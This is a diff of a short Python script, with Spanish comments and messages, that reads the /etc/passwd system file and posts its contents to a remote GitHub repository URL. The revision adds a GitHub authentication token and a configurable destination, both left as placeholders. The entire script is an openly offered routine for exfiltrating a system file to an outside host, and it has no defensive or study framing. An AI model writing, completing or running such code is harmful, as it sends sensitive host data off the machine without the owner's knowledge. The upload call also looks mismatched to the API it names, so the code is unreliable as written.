@@ -1,33 +1,25 @@
 import os
-
 import requests
- 
+
 def get_passwd():
+  """Obtiene el archivo passwd."""
+  with open("/etc/passwd", "r") as f:
+    return f.read()
 
-    """Obtiene el archivo passwd."""
+def send_passwd(passwd, token, url):
+  """Envía el archivo passwd a una ubicación remota usando un token de autenticación de GitHub."""
+  headers = {
+    "Authorization": "token {}".format(token)
+  }
+  response = requests.post(url, headers=headers, data=passwd)
 
-    return open("/etc/passwd", "r").read()
- 
-def send_passwd(passwd):
+  if response.status_code == 200:
+    print("El archivo passwd se cargó correctamente.")
+  else:
+    print("No se pudo cargar el archivo passwd.")
 
-    """Envía el archivo passwd a una ubicación remota."""
-
-    # Sustituya la siguiente URL por la URL de la ubicación remota donde desea cargar el archivo passwd.
-
-    url = "https://github.com/<username>/<repo>/contents/passwd.txt"
-
-    response = requests.post(url, data=passwd)
-
-    if response.status_code == 200:
-
-        print("El archivo passwd se cargó correctamente.")
-
-    else:
-
-        print("No se pudo cargar el archivo passwd.")
- 
 if __name__ == "__main__":
-
-    passwd = get_passwd()
-
-    send_passwd(passwd)
+  passwd = get_passwd()
+  token = "<token de autenticación de GitHub>" # Reemplace por su token real
+  url = "https://api.github.com/repos/<username>/<repo>/contents/passwd.txt" # Reemplace por la URL real
+  send_passwd(passwd, token, url)
